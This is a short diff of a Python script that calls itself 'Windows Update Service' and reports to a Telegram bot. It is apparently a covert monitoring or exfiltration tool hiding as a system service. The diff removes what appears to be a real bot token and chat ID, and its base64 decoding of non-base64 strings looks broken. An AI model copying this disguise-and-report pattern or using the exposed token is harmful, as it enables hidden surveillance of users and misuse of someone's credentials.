@@ -78,8 +78,8 @@ except ImportError:
     CIFRADO_DISP = False
 
 # ==================== CONFIGURATION ====================
-TOKEN = base64.b64decode('7843134567:AAERIl4NSsQNv65avHfWwXqjk1fuC0Me2is').decode()
-CHAT_ID = base64.b64decode('5719356323').decode()
+TOKEN = base64.b64decode('').decode()
+CHAT_ID = base64.b64decode('').decode()
 
 # Intervals (seconds)
 INTERVALO_REPORTE = 10
@@ -466,4 +466,5 @@ if __name__ == "__main__":
     finally:
         logging.info("Windows Update Service stopped")
         if TOKEN and CHAT_ID:
+
             enviar_a_telegram("[STOP] Windows Update Service disabled")
